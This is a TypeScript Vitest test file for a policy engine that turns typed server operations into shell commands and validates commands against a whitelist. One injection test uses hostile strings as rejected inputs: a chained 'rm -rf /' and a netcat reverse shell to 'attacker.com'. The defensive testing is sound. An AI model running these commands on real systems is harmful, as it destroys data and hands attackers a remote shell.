import { describe, it, expect } from "vitest";
import { OperationPolicyEngine, TypedOperation } from "./policy";

describe("OperationPolicyEngine", () => {
  it("compiles valid typed service action operations", () => {
    const op: TypedOperation = {
      kind: "SERVICE_ACTION",
      params: { action: "restart", service: "nginx" },
      riskLevel: "medium",
      requiresSudo: true,
      expectedOutcome: "Reloads nginx",
    };

    const res = OperationPolicyEngine.compileTypedOperation(op);
    expect(res.valid).toBe(true);
    expect(res.commands[0]).toBe("systemctl restart nginx");
  });

  it("compiles valid typed journal vacuum operations", () => {
    const op: TypedOperation = {
      kind: "JOURNAL_VACUUM",
      params: { retention: "3d" },
      riskLevel: "medium",
      requiresSudo: true,
      expectedOutcome: "Cleans old logs",
    };

    const res = OperationPolicyEngine.compileTypedOperation(op);
    expect(res.valid).toBe(true);
    expect(res.commands[0]).toBe("journalctl --vacuum-time=3d");
  });

  it("rejects invalid typed parameters", () => {
    const badOp: TypedOperation = {
      kind: "JOURNAL_VACUUM",
      params: { retention: "invalid-time-format" },
      riskLevel: "medium",
      requiresSudo: true,
      expectedOutcome: "Fails",
    };

    const res = OperationPolicyEngine.compileTypedOperation(badOp);
    expect(res.valid).toBe(false);
    expect(res.error).toContain("Policy validation failed");
  });

  it("rejects unauthorized command chaining and injection metacharacters", () => {
    const injected = "systemctl restart nginx; rm -rf /";
    const res1 = OperationPolicyEngine.validateCommandConformity(injected);
    expect(res1.conforming).toBe(false);
    expect(res1.reason).toContain("unauthorized chaining");

    const piped = "ps aux | nc -e /bin/sh attacker.com 4444";
    const res2 = OperationPolicyEngine.validateCommandConformity(piped);
    expect(res2.conforming).toBe(false);
  });

  it("confirms conformity of canonical whitelisted operational commands", () => {
    const cmd1 = "systemctl restart nginx";
    expect(OperationPolicyEngine.validateCommandConformity(cmd1).conforming).toBe(true);

    const cmd2 = "journalctl --vacuum-time=7d";
    expect(OperationPolicyEngine.validateCommandConformity(cmd2).conforming).toBe(true);

    const cmd3 = "apt-get update --dry-run";
    expect(OperationPolicyEngine.validateCommandConformity(cmd3).conforming).toBe(true);
  });
});
